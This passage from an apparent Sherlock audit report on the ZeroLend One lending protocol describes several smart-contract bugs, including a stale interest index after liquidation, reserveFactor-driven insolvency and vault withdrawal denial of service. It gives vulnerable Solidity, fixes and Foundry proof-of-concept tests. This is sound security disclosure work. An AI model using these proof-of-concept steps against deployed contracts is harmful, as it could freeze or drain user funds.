Protocol users who manage their positions through the  `PositionManager` are not able to manage risk of their positions, by setting collateral to on and off. Which is a core functionality of every lending protocol. The missing functionality will doss users from withdrawing also in certain conditions.
## Vulnerability Detail
For each collateral resrve the pool tracks whethere the user is using as collateral or not, this is set in the userConfigMap. Any user could set which reserve he is setting as collateral by calling the 

```solidity
function setUserUseReserveAsCollateral(address asset, uint256 index, bool useAsCollateral) external {
    _setUserUseReserveAsCollateral(asset, index, useAsCollateral);
  }
```
The PositionManager.sol which the protocol users, are expected to interact with, doesn't implement the setUserUseReserveAsCollateral(), which first of all leads to the inablity of protocol users to manage risk on their Positions. 
The second impact and the most severe is that Position holders will be dossed, in the protocols if the ltv of one of the reserve token being used, will be set to zero. In such an event, users are required to set the affected collateral to false in order to do operations that lowers the ltv like withdraw to function.

The doss will be done in the function `validateHFandLtv()` which will be called to check the health of a position is maintend after a withdrawal

```solidity
  function validateHFAndLtv(
    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage _balances,
    mapping(address => DataTypes.ReserveData) storage reservesData,
    mapping(uint256 => address) storage reservesList,
    DataTypes.UserConfigurationMap memory userConfig,
    DataTypes.ExecuteWithdrawParams memory params
  ) internal view {
    DataTypes.ReserveData memory reserve = reservesData[params.asset];

    (, bool hasZeroLtvCollateral) = validateHealthFactor(_balances, reservesData, reservesList, userConfig, params.position, params.pool);

@>>    require(!hasZeroLtvCollateral || reserve.configuration.getLtv() == 0, PoolErrorsLib.LTV_VALIDATION_FAILED);
  }
```
In this case, if the user wants to withdraw other reserves that don't have 0 tlv, the transaction will revert.


## Impact
- missing core functions, that NFTPositionManager users are not able to use
- NFTPositionManager are unable to manage to risk at all
- Withdrawal operations in NFTPositionManager will be dossed in certain conditions

## Code Snippet
https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/Pool.sol#L175C1-L177C4
## Tool used

Manual Review

## Recommendation
Implement the missing functionality in the `NFTPositionManager.sol`, to allow users to manage the risk on their `NFTPosition`

# Issue M-13: Liquidation fails to update the interest Rate when liquidation funds are sent to the treasury thus the next user uses an inflated index 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/401 

## Found by 
A2-security, Bigsam, almurhasan, nfmelendez, trachev
### Summary

A bug exists in the Zerolend liquidation process where the interest rate is not updated before transferring liquidation funds to the treasury. This omission leads to an inflated index being used by the next user when performing subsequent actions such as deposits, withdrawals, or borrowing, similar to the previously reported bug in the withdrawal function. As a result, the next user may receive fewer shares or incur an incorrect debt due to the artificially high liquidity rate.

---


### Root Cause


Examples of update rate before transferring everywhere in the protocol to maintain Rate 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L69-L81

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L125-L146

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L88-L99

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L139-L158

The same process can be observed in Aave v 3.

1. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L130
2. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L65
3. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L145-L150
4.  https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L227-L232

Looking at the effect of updating rate 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L134-L182

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/periphery/ir/DefaultReserveInterestRateStrategy.sol#L98-L131

This rates are used to get the new index

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225-L227

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L235-L237

-


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

During the liquidation process in Zerolend, when funds are transferred to the **treasury** as a liquidation protocol fee, the interest rate in the pool is **not updated** before the transfer. This failure results in the next user's interaction with the protocol (such as a deposit, withdrawal, or loan) being calculated based on an **inflated liquidity rate**. The inflated rate causes the user to receive fewer shares than they should or be charged an incorrect interest rate.

In contrast, **Aave’s approach** ensures that the interest rate is always updated when necessary and adjusted when funds are moved outside the system. Aave achieves this by transferring the funds inside the contract in the form of **aTokens**, which track liquidity changes, and since atokens are not burnt there is no need to update the interest rate accordingly in this case. 

Zerolend, however, directly transfers funds out of the pool without recalculating the interest rate, which leads to inconsistencies in the index used by the next user.

#### Code Context:

In Zerolend's liquidation process, when a user is liquidated and the liquidation fee is sent to the treasury, the protocol transfers the funds directly without updating the interest rate.

```solidity
// Transfer fee to treasury if it is non-zero
if (vars.liquidationProtocolFeeAmount != 0) {
    uint256 liquidityIndex = collateralReserve.getNormalizedIncome();
    uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);
    uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;

    if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {
        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);
    }
@audit >> transferring underlying asset out without updating interest rate first>>>>

    IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);
}
```

As can be seen in the code, the liquidation protocol fee is transferred to the treasury, but no interest rate update takes place **before** the transfer. This results in an incorrect liquidity rate for the next user interaction.

#### Comparison with Aave:

Aave uses **aTokens** for transfers within the protocol, and the interest rate is updated accordingly when funds are moved, ensuring that the liquidity rate and index are always accurate. In Aave’s liquidation process, the aTokens are transferred to the treasury rather than removing liquidity directly from the pool.

```solidity
vars.collateralAToken.transferOnLiquidation(
    params.user,
    vars.collateralAToken.RESERVE_TREASURY_ADDRESS(),
    vars.liquidationProtocolFeeAmount
);
```

In Aave’s implementation, the **aToken** system ensures that the liquidity and interest rates are intact based on the movement of funds and not transferring underlying assets.

---

### Impact

- **Incorrect Share Calculation**: Deposits, withdrawals, and loans after a liquidation may use an inflated liquidity rate, resulting in **fewer shares** minted for depositors or incorrect debt calculations for borrowers.
- **Protocol Inconsistency**: The protocol operates with an inaccurate interest rate after each liquidation, leading to potential financial discrepancies across user interactions.

### PoC

_No response_

### Mitigation

To address this issue, the **interest rate must be updated** before transferring any liquidation protocol fees to the treasury. This ensures that the system correctly accounts for the reduction in liquidity due to the transfer. This will be my last report here before transferring funds to the treasury also a bug was discovered before transferring. kind fix also. thank you for the great opportunity to audit your code i wish zerolend the very best in the future.

#### Suggested Fix:

In the liquidation logic, invoke the **`updateInterestRates`** function on the **collateral reserve** before transferring the funds to the treasury. This will ensure that the correct liquidity rate is applied to the pool before the funds are removed.

##### Modified Code Example:

```solidity

if (vars.liquidationProtocolFeeAmount != 0) {
    uint256 liquidityIndex = collateralReserve.getNormalizedIncome();
    uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);
    uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;

    if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {
        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);
    }

++   // Before transferring liquidation protocol fee to treasury, update the interest rates
++   collateralReserve.updateInterestRates(
++  totalSupplies,
++  collateralReserveCache,
++  params.collateralAsset,
++  IPool(params.pool).getReserveFactor(),
++  0, // No liquidity added
++   vars.liquidationProtocolFeeAmount, // Liquidity taken during liquidation
++  params.position,
++ params.data.interestRateData
++ );

++ // Now, transfer fee to treasury if it is non-zero

    IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);
}
```

In this updated version, the interest rates are recalculated **before** the liquidation protocol fee is transferred to the treasury. This ensures that subsequent deposits, withdrawals, and loans use the correct liquidity rate and avoid discrepancies caused by an inflated index.



## Discussion

**nevillehuang**

request poc

Seems related to #387 in terms of root cause

**sherlock-admin4**

PoC requested from @Tomiwasa0

Requests remaining: **14**

**Tomiwasa0**

1. After setting liquidationProtocolFeePercentage to 20%, 20-10% using aave's examples

2.  add to addresses

```solidity
  ++   address sam = address(3);
  ++   address dav = address(4);
```

4. PASTE AND RUN THE POC

```solidity
  function _generateLiquidationCondition() internal {
   _mintAndApprove(alice, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA
   _mintAndApprove(sam, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA
    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB
     _mintAndApprove(dav, tokenA, mintAmountA, address(pool)); // bob 2000 tokenB

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0); // 550 tokenA alice supply
    vm.stopPrank();

    
    vm.startPrank(sam);
    pool.supplySimple(address(tokenA), sam, supplyAmountA, 0); // 550 tokenA alice supply
    vm.stopPrank();

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
    vm.stopPrank();

    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0); // 100 tokenB alice borrow
    vm.stopPrank();

     vm.startPrank(sam);
    pool.borrowSimple(address(tokenB), sam, borrowAmountB, 0); // 100 tokenB alice borrow
    vm.stopPrank();
    
    vm.startPrank(bob);
    pool.borrowSimple(address(tokenA), bob , 500e18, 0); // 100 tokenB alice borrow
    vm.stopPrank();
     // Get the current block timestamp
        uint256 currentTime = block.timestamp;

    // Set the block.timestamp to current time plus 100 seconds
        vm.warp(currentTime + 1000);


    assertEq(tokenB.balanceOf(alice), borrowAmountB);

    oracleA.updateAnswer(0.45e8);
  }

``` 

**Updated Liquidation  Function:**

```solidity
function testLiquidationSimple2() external {
    _generateLiquidationCondition();
    (, uint256 totalDebtBase,,,,) = pool.getUserAccountData(alice, 0);

    vm.startPrank(bob);
    // vm.expectEmit(true, true, true, false);
    // emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);
    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 100 ether);

    vm.stopPrank();

    (, uint256 totalDebtBaseNew,,,,) = pool.getUserAccountData(alice, 0);

    assertTrue(totalDebtBase > totalDebtBaseNew);
    
    // Get the current block timestamp
    uint256 currentTime3 = block.timestamp;

    // Set the block.timestamp to current time plus 100 seconds
    vm.warp(currentTime3 + 500);

    vm.startPrank(dav);
    pool.supplySimple(address(tokenA), dav, 100e18, 0); // 550 tokenA alice supply
    vm.stopPrank();
   
    assertEq(pool.getBalanceRaw(address(tokenA), dav, 0).supplyShares, 99999784100498438999);
}
```


Before Updating the index with Amount minted to tresury
dav got - 99999784100498438999;
After update - 99999783033155331339,


```solidity
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 67.39ms (15.32ms CPU time)

Ran 1 test suite in 2.36s (67.39ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest
[FAIL. Reason: assertion failed: 99999783033155331339 != 99999784100498438999] testLiquidationSimple1() (gas: 1610672)
```

5. Other points are stated in issue 387


# Issue M-14: Inconsistent Application of Reserve Factor Changes Leads to Protocol Insolvency Risk 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/402 

## Found by 
A2-security, denzi\_, zarkk01
## Summary

The ZeroLend protocol's `PoolFactory` allows for global changes to the `reserveFactor`, which affects all pools simultaneously. However, the `ReserveLogic` contract applies this change inconsistently between interest accrual and treasury minting processes. This inconsistency leads to a mismatch between accrued interest for users and the amount minted to the treasury, causing protocol insolvency or locked funds.

## Vulnerability Detail

The `reserveFactor` is a crucial parameter in the protocol that determines the portion of interest accrued from borrowers that goes to the protocol's treasury. It's defined in the `PoolFactory` contract:

```js
contract PoolFactory is IPoolFactory, Ownable2Step {
// ...
uint256 public reserveFactor;
// ...
}
```

This `reserveFactor` is used across all pools created by the factory. It's retrieved in various operations, such as in the `supply` function for example :

```js
function _supply(address asset, uint256 amount, bytes32 pos, DataTypes.ExtraData memory data) internal nonReentrant(RentrancyKind.LENDING) returns (DataTypes.SharesType memory res) {
// ...
res = SupplyLogic.executeSupply(
_reserves[asset],
_usersConfig[pos],
_balances[asset][pos],
_totalSupplies[asset],
DataTypes.ExecuteSupplyParams({reserveFactor: _factory.reserveFactor(), /_ ... _/})
);
// ...
}
```

The `reserveFactor` plays a critical role in calculating interest rates and determining how much of the accrued interest goes to the liquidity providers and how much goes to the protocol's treasury . The issue arises from the fact that this `reserveFactor` can be changed globally for all pools:

```js
function setReserveFactor(uint256 updated) external onlyOwner {
uint256 old = reserveFactor;
reserveFactor = updated;
emit ReserveFactorUpdated(old, updated, msg.sender);
}
```

 let's examine how this change affects the core logic in the `ReserveLogic` contract:

```js
function updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {
if (self.lastUpdateTimestamp == uint40(block.timestamp)) return;

    _updateIndexes(self, _cache);
    _accrueToTreasury(_reserveFactor, self, _cache);

    self.lastUpdateTimestamp = uint40(block.timestamp);

}
```

The vulnerability lies in the fact that `_updateIndexes` and `_accrueToTreasury` will use different `reserveFactor` values when a change occurs:

if the reserveFactors is changed `_updateIndexes` will uses the old `reserveFactor` implicitly through cached liquidityRate:

```js
function _updateIndexes(DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {
if (_cache.currLiquidityRate != 0) {
uint256 cumulatedLiquidityInterest = MathUtils.calculateLinearInterest(_cache.currLiquidityRate, _cache.reserveLastUpdateTimestamp);
_cache.nextLiquidityIndex = cumulatedLiquidityInterest.rayMul(_cache.currLiquidityIndex).toUint128();
_reserve.liquidityIndex = _cache.nextLiquidityIndex;
}
// ...
}
```

`_accrueToTreasury` will use the new `reserveFactor`:

```js
function _accrueToTreasury(uint256 reserveFactor, DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {
// ...
vars.amountToMint = vars.totalDebtAccrued.percentMul(reserveFactor);
if (vars.amountToMint != 0) _reserve.accruedToTreasuryShares += vars.amountToMint.rayDiv(_cache.nextLiquidityIndex).toUint128();
}
```

This discrepancy results in the protocol minting more/less treasury shares than it should based on the actual accrued interest cause it uses the new `reserveFactor`. Over time, this can lead to a substantial overallocation/underallocation of funds to the treasury, depleting the reserves available for users or leaving funds locked in the pool contract forever.

#### example scenario :
- to simplify this issue consider the following example : 
- Deposited: `10,000 USD`
- Borrowed: `10,000 USD`
- Initial `reserveFactor`: `10%`
- Borrow rate: `12%`
- Utilization ratio: `100%`
- Liquidity rate: `12% * (100% - 10%) = 10.8%`

After 2 months:

- Accrued interest: `200 USD`
- `reserveFactor` changed to `30%`
- `updateState` is called:
  - `_updateIndexes`: Liquidity index = `(0.018 + 1) * 1 = 1.018` (based on old `10.8%` rate)
  - `_accrueToTreasury`: Amount to mint = `200 * 0.3 = 60 USD` (using new `30%` `reserveFactor`)

When a user attempts to withdraw:

- User's assets: `10,000 * 1.018 = 10,180 USD`
- Treasury owns: `60 USD`
- Total required: `10,240 USD`

However, the borrower only repaid `10,200 USD` (`10,000` principal + `200` interest), resulting in a `40 USD` shortfall. This discrepancy can lead to failed withdrawals and insolvency of the protocol.

## Impact

the Chage of `reserveFactor` leads to protocol insolvency risk or locked funds. Increased `reserveFactor` causes over-minting to treasury, leaving insufficient funds for user withdrawals. Decreased `reserveFactor` results in under-minting, locking tokens in the contract permanently. Both scenarios compromise the protocol's financial integrity

## Code Snippet

- https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/PoolFactory.sol#L112-L116
- https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L210

## Tool used

Manual Review

## Recommendation

- Given ZeroLend's permissionless design where anyone can create a pool, updating all pools simultaneously before updating the `reserveFactor` is impractical. we recommend storing the `lastReserveFactor` used for each pool. This approach is similar to other protocols and ensures consistency between interest accrual and treasury minting.

Add a new state variable in the ReserveData struct:

```diff
struct ReserveData {
    // ... existing fields
+    uint256 lastReserveFactor;
}
```

Modify the updateState function to use and update this lastReserveFactor:

```diff
function updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {
    if (self.lastUpdateTimestamp == uint40(block.timestamp)) return;

    _updateIndexes(self, _cache);
-   _accrueToTreasury(_reserveFactor, self, _cache);
+   _accrueToTreasury(self.lastReserveFactor, self, _cache);

    self.lastUpdateTimestamp = uint40(block.timestamp);
+   self.lastReserveFactor = _reserveFactor;
}
```

This solution ensures that the same reserveFactor is used for both interest accrual and treasury minting within each update cycle, preventing inconsistencies while allowing for global reserveFactor changes to take effect gradually across all pools.



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  invalid: the cached reserveFactor is also the same used to accrue to treasury.



**nevillehuang**

request poc

Seems related to #199

**sherlock-admin3**

PoC requested from @A2-security

Requests remaining: **19**

**aliX40**

hey @nevillehuang  ,this is not a dup of #199 , we have #316 which is duplicate of #199 . this one is different 
- the comment : 
> invalid: the cached reserveFactor is also the same used to accrue to treasury.
is incorrect 

- here a poc shows how change the factor will lead to insolvency and cause the last withdrawal not able to 
first we need to correct the balance calculation in [PositionBalanceConfiguration](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol): 
```diff
  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {
-     uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);
-     return self.supplyShares + increase;
+    return self.supplyShares.rayMul(index);
  }

  function getDebtBalance(DataTypes.PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {
-     uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);
-     return self.debtShares + increase;
+    return self.debtShares.rayMul(index);
  }
```
- add this test to [PoolRepayTests](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/test/forge/core/pool/PoolRepayTests.t.sol#L9)
```js
  function test_auditPoc_reserve() external {
    console.log('balance pool before : ', tokenA.balanceOf(address(pool)));
    _mintAndApprove(alice, tokenA, 2 * amount, address(pool));
    vm.startPrank(alice);

    pool.supplySimple(address(tokenA), alice, amount, 0); // deposit : 2000e18
    pool.borrowSimple(address(tokenA), alice, borrowAmount, 0); // borrow : 800e18

    vm.stopPrank();
    // wrap sometime so the intrest accrue :
    vm.warp(block.timestamp + 30 days);
    // change reserve factor to 0.2e4 (20%):
    poolFactory.setReserveFactor(0.2e4);

    vm.startPrank(alice);
    tokenA.approve(address(pool), UINT256_MAX);
    pool.repaySimple(address(tokenA), UINT256_MAX, 0);
    // withdraw all will revert cause there is not enough funds for treasury due to updating the factor :
    vm.expectRevert();
    pool.withdrawSimple(address(tokenA), alice, UINT256_MAX, 0);
    vm.stopPrank();

  }
  ```
  - the transaction will revert , because the amount accrued to treasury , doesn't exist , and please notice that this will effect all the pool in the protocol , and this amount will keep growing , since it's accumulate yield as well , which is insolvency


The issue described in the report, is similar to a bug found in the aave v3 codebase when updating the reserveFactor. This bug have been disclosed and fixed with the v3.1 release
https://github.com/aave-dao/aave-v3-origin/blob/3aad8ca184159732e4b3d8c82cd56a8707a106a2/src/core/contracts/protocol/pool/PoolConfigurator.sol#L300C1-L315C4
```solidity
  function setReserveFactor(
    address asset,
    uint256 newReserveFactor
  ) external override onlyRiskOrPoolAdmins {
    require(newReserveFactor <= PercentageMath.PERCENTAGE_FACTOR, Errors.INVALID_RESERVE_FACTOR);

  @>>   _pool.syncIndexesState(asset);

    DataTypes.ReserveConfigurationMap memory currentConfig = _pool.getConfiguration(asset);
    uint256 oldReserveFactor = currentConfig.getReserveFactor();
    currentConfig.setReserveFactor(newReserveFactor);
    _pool.setConfiguration(asset, currentConfig);
    emit ReserveFactorChanged(asset, oldReserveFactor, newReserveFactor);

    _pool.syncRatesState(asset);
  }
```

Also the fix we recomended is inspired by how the eulerv2 handled this, in their vault. (cache reserve factor when calling updateInterestrate, and use the cached factor when updating the index!)

# Issue M-15: Withdrawals can be reverted in the curated vault 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/411 

## Found by 
ether\_sky, trachev
## Summary
Users can `deposit` `assets` into selected `pools` via a `curated vault`. 
By doing so, they may `withdraw` more `assets`, as `interest` accumulates in the `pools` over time. 
However, `withdrawals` may sometimes fail, making it difficult to resolve the issue.
## Vulnerability Detail
When users request a `withdrawal` through the `curated vault`, the `vault` pulls `assets` from the selected `pools` one by one. 
```solidity
function _withdrawPool(uint256 withdrawAmount) internal {
  for (uint256 i; i < withdrawQueue.length; ++i) {
    IPool pool = withdrawQueue[i];
    (uint256 supplyAssets,) = _accruedSupplyBalance(pool);
150:    uint256 toWithdraw =
      UtilsLib.min(_withdrawable(pool, pool.totalAssets(asset()), pool.totalDebt(asset()), supplyAssets), withdrawAmount);
  }

  if (withdrawAmount != 0) revert CuratedErrorsLib.NotEnoughLiquidity();
}
```
On `line 150`, the `withdrawable` amount from each `pool` is calculated. 
In the `_withdrawable` function, there is a potential for `underflow` if `totalSupplyAssets` is less than `totalBorrowAssets`, preventing users from `withdrawing` their `assets`.
```solidity
function _withdrawable(
  IPool pool,
  uint256 totalSupplyAssets,
  uint256 totalBorrowAssets,
  uint256 supplyAssets
) internal view returns (uint256) {
  uint256 availableLiquidity = UtilsLib.min(totalSupplyAssets - totalBorrowAssets, IERC20(asset()).balanceOf(address(pool)));
  return UtilsLib.min(supplyAssets, availableLiquidity);
}
```

It’s important to note that the `pool` doesn’t guarantee that `totalSupplyAssets` will always exceed `totalBorrowAssets`. 
Some users interact directly with these `pools` without going through the `curated vault`. 
If all supplied `assets` are `borrowed` and the `borrow index` exceeds the `liquidity index`, or if depositors `withdraw` as much as possible while `borrowers` maintain their positions, `totalSupplyAssets` can drop below `totalBorrowAssets`.

To address this issue, the `vault` can remove the `pool` from the `withdrawQueue`. 
However, this action might cause users to lose their funds, as `assets` supplied to the `pool` would no longer be factored in.
## Impact
This is a `DoS`.
## Code Snippet
https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L150
https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVaultGetters.sol#L126-L127
## Tool used

Manual Review

## Recommendation
```solidity
function _withdrawable(
  IPool pool,
  uint256 totalSupplyAssets,
  uint256 totalBorrowAssets,
  uint256 supplyAssets
) internal view returns (uint256) {
-  uint256 availableLiquidity = UtilsLib.min(totalSupplyAssets - totalBorrowAssets, IERC20(asset()).balanceOf(address(pool)));
+  uint256 availableLiquidity = totalSupplyAssets < totalBorrowAssets ? 0 : UtilsLib.min(totalSupplyAssets - totalBorrowAssets, IERC20(asset()).balanceOf(address(pool)));

  return UtilsLib.min(supplyAssets, availableLiquidity);
}
```



## Discussion

**nevillehuang**

request poc

Seems invalid, can the DoS be of more than 7 days? Does it meet sherlock rules of DoS? i.e

- Must break core contract functionality
- Must DoS funds for more than a week without any form of admin retrieval
- Must be a time sensitive function

**sherlock-admin4**

PoC requested from @etherSky111

Requests remaining: **18**

**etherSky111**

Thanks for judging.

Below is the `PoC` (`ERC4626Test.sol`): 
```solidity
function testWithdrawRevert() public {
  uint256 mintAmount = 1000 ether;
  /**
    1. Set the cap of allMarkets[1] to 1000 ether
    */
  _setCap(allMarkets[1], mintAmount);

  /**
    2. Create a supplyQueue consisting of [allMarkets[1], allMarkets[0], idleMarket]
    */
  IPool[] memory newSupplyQueue = new IPool[](3);
  newSupplyQueue[0] = allMarkets[1];
  newSupplyQueue[1] = allMarkets[0];
  newSupplyQueue[2] = idleMarket;

  /**
    3. Set the withdrawQueue to match the supplyQueue. (current withdraw queue is [idleMarket, allMarkets[0], allMarkets[1]] so we need to reverse it.)
    */
  uint256[] memory indexes = new uint256[](3);
  indexes[0] = 2; indexes[1] = 1; indexes[2] = 0;

  vm.prank(allocator);
  vault.setSupplyQueue(newSupplyQueue);
  vm.stopPrank();
  vm.prank(allocator);
  vault.updateWithdrawQueue(indexes);
  vm.stopPrank();

  console2.log('supply queue        => ', address(vault.supplyQueue(0)), address(vault.supplyQueue(1)), address(vault.supplyQueue(2)));
  console2.log('withdraw queue      => ', address(vault.withdrawQueue(0)), address(vault.withdrawQueue(1)), address(vault.withdrawQueue(2)));

  address U1 = address(111);
  address U2 = address(222);
  
  /**
    4. User U1 deposits 1000 ether of tokenA into the vault. These tokens will be directed to the first market in the sequence, which is `allMarkets[1].
    */
  _mintAndApprove(U1, tokenA, mintAmount, address(vault));
  vm.prank(U1);
  vault.deposit(mintAmount, U1);
  vm.stopPrank();

  /**
    5. User U1 deposits an additional 1000 ether of tokenA into the vault. 
      Since the cap of the first market (allMarkets[1]) has been reached, these tokens will be deposited into the second market, allMarkets[0].
    */
  _mintAndApprove(U1, tokenA, mintAmount, address(vault));
  vm.prank(U1);
  vault.deposit(mintAmount, U1);
  vm.stopPrank();

  console2.log('supplied tokens to the first 2 markets   => ', tokenA.balanceOf(address(allMarkets[1])), tokenA.balanceOf(address(allMarkets[0])));

  DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));

  /**
    6. User U2 interacts directly with allMarkets[1] by depositing 10,000 ether of tokenB into allMarkets[1].
    */
  _mintAndApprove(U2, tokenB, 10 * mintAmount, address(allMarkets[1]));
  vm.prank(U2);
  allMarkets[1].supply(address(tokenB), U2, 10 * mintAmount, 0, data);
  vm.stopPrank();

  /**
    7. Now, User U2 can borrow 1000 ether of tokenA from allMarkets[1] since they have sufficient collateral(tokenB).
    */
  oracleB.updateRoundTimestamp();
  oracle.updateRoundTimestamp();
  vm.prank(U2);
  allMarkets[1].borrow(address(tokenA), U2, mintAmount, 0, data);
  vm.stopPrank();

  DataTypes.ReserveData memory reserveData_0 = allMarkets[1].getReserveData(address(tokenA));
  /**
    8. The initial liquidity index and borrow index are the same. 
    */
  console2.log('initial liquidity index                => ', reserveData_0.liquidityIndex);
  console2.log('initial borrow index                   => ', reserveData_0.borrowIndex);
  console2.log('liquidity rate                         => ', reserveData_0.liquidityRate);
  console2.log('borrow rate                            => ', reserveData_0.borrowRate);

  vm.warp(block.timestamp + 1 days);
  allMarkets[1].forceUpdateReserve(address(tokenA));
  DataTypes.ReserveData memory reserveData_1 = allMarkets[1].getReserveData(address(tokenA));
  /**
    9. After one day, the borrow index increases more than the liquidity index due to the difference in interest calculations—linear for liquidity and compound for borrowing.
    */
  console2.log('updated liquidity index                => ', reserveData_1.liquidityIndex);
  console2.log('updated borrow index                   => ', reserveData_1.borrowIndex);

  /**
    10. As a result, the total debt exceeds the total assets.
    */
  console2.log('total assets     => ', allMarkets[1].totalAssets(address(tokenA)));
  console2.log('total debts      => ', allMarkets[1].totalDebt(address(tokenA)));

  bool runTest = false;
//  bool runTest = true;
  if (runTest) {
    vm.prank(U1);
    vault.withdraw(mintAmount, U1, U1);
    vm.stopPrank();
  }
}
```
All steps are outlined in the comments within the code. 

Below is the log detailing the specific values.
```solidity
supply queue        =>  0x0FdE84cf57B5fB0C2FA4339BE0C3ba34e951Bf60 0xC8011cB77CC747B5F30bAD583eABfb522Be25712 0x543A7158a1a615F84550166650E0b4cd11659792
withdraw queue      =>  0x0FdE84cf57B5fB0C2FA4339BE0C3ba34e951Bf60 0xC8011cB77CC747B5F30bAD583eABfb522Be25712 0x543A7158a1a615F84550166650E0b4cd11659792

supplied tokens to the first 2 markets   =>  1000000000000000000000 1000000000000000000000

initial liquidity index                =>  1000000000000000000000000000
initial borrow index                   =>  1000000000000000000000000000
liquidity rate                         =>  370000000000000000000000000
borrow rate                            =>  370000000000000000000000000

updated liquidity index                =>  1001013698630136986301369863
updated borrow index                   =>  1001014212590245764091339463

total assets     =>  1001013698630136986301
total debts      =>  1001014212590245764091
```
If you set `runTest` to `true` in the above `PoC`, you will encounter the following revert reason.
```solidity
[2386] market-1::totalAssets(loanToken: [0xE18de8003234FcA1f7d57713877F92F482D1a1c3]) [staticcall]
    │   │   │   ├─ [380] PoolFactory::implementation() [staticcall]
    │   │   │   │   └─ ← [Return] Pool: [0x4f22fB6CDf1485baf7B25c58c66CdA38f88Acbc3]
    │   │   │   ├─ [1002] Pool::totalAssets(loanToken: [0xE18de8003234FcA1f7d57713877F92F482D1a1c3]) [delegatecall]
    │   │   │   │   └─ ← [Return] 1001013698630136986301 [1.001e21]
    │   │   │   └─ ← [Return] 1001013698630136986301 [1.001e21]
    │   │   ├─ [2340] market-1::totalDebt(loanToken: [0xE18de8003234FcA1f7d57713877F92F482D1a1c3]) [staticcall]
    │   │   │   ├─ [380] PoolFactory::implementation() [staticcall]
